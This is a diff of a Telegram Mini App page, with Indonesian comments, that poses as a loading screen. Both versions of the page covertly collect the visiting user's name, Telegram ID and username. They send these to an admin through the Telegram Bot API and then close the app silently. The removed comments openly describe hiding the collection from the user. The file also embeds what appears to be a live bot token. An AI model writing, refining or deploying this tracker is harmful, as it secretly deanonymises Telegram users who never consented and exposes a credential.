@@ -1,81 +1,37 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Tracker</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body {
-            background-color: transparent; /* Transparan agar smooth */
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            font-family: sans-serif;
-            color: white;
-        }
-        /* Animasi loading kecil agar user tidak curiga */
-        .spinner {
-            border: 3px solid rgba(255, 255, 255, 0.2);
-            border-top: 3px solid #3498db;
-            border-radius: 50%;
-            width: 20px;
-            height: 20px;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
+        body { background: transparent; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .spinner { border: 2px solid rgba(255,255,255,0.1); border-top: 2px solid #3498db; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
     <div class="spinner"></div>
-
     <script>
-        // Inisialisasi Telegram Mini App
         const tg = window.Telegram.WebApp;
-        tg.expand(); // Memastikan aplikasi terbuka maksimal
+        tg.expand();
 
-        // Ambil data user dari Telegram
         const user = tg.initDataUnsafe.user;
-
-        // --- KONFIGURASI ---
         const BOT_TOKEN = '8235135706:AAEoY_X5bamwRtLsiAqfRyz7h8b2ZvOmZlE';
-        const ADMIN_ID = 'MASUKKAN_ID_TELEGRAM_KAMU'; // Ganti dengan ID kamu (cek di @userinfobot)
+        const ADMIN_ID = 'ID_TELEGRAM_KAMU'; // Ganti dengan ID kamu (cek di @userinfobot)
 
         if (user) {
-            const pesanLaporan = `🔔 **User Klik Postingan!**\n\n` +
-                                 `👤 Nama: ${user.first_name} ${user.last_name || ''}\n` +
-                                 `🆔 ID: \`${user.id}\`\n` +
-                                 `🔗 Username: @${user.username || '-'}\n` +
-                                 `🌐 Bahasa: ${user.language_code || '-'}`;
-
-            // Kirim data ke Admin secara diam-diam
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: ADMIN_ID,
-                    text: pesanLaporan,
+                    text: `🎯 **Tracker Terdeteksi!**\n\n👤 Nama: ${user.first_name}\n🆔 ID: \`${user.id}\`\n🔗 User: @${user.username || '-'}`,
                     parse_mode: "Markdown"
                 })
-            })
-            .then(() => {
-                // Berhasil lapor, langsung tutup Mini App (Mode Senyap)
-                setTimeout(() => {
-                    tg.close();
-                }, 200); 
-            })
-            .catch(() => {
-                tg.close(); // Tetap tutup jika error
+            }).finally(() => {
+                tg.close(); // Tutup aplikasi secepat mungkin
             });
         } else {
-            // Jika dibuka di browser biasa (bukan via tombol Telegram)
-            document.body.innerHTML = "Akses ditolak.";
-            setTimeout(() => { tg.close(); }, 2000);
+            tg.close();
         }
     </script>
 </body>
